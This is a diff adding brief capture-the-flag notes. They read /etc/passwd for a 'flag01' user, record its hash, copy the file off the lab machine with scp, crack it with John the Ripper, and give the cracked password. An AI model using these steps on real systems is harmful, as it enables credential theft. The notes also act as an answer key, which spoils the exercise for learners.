@@ -1,0 +1,11 @@
+find / -name 'passwd' 2>/dev/null
+cat /etc/passwd | grep flag01
+
+#42hDRfypTqqnw
+# download https://download.openwall.net/pub/projects/john/contrib/macosx/
+# move passwd file into host directory - look at your ip, port, directory
+scp -P 5000 level00@192.168.56.1:/../../../etc/passwd .
+# crack it 
+./john passwd
+./john passwd --show
+#passwd - abcdefg
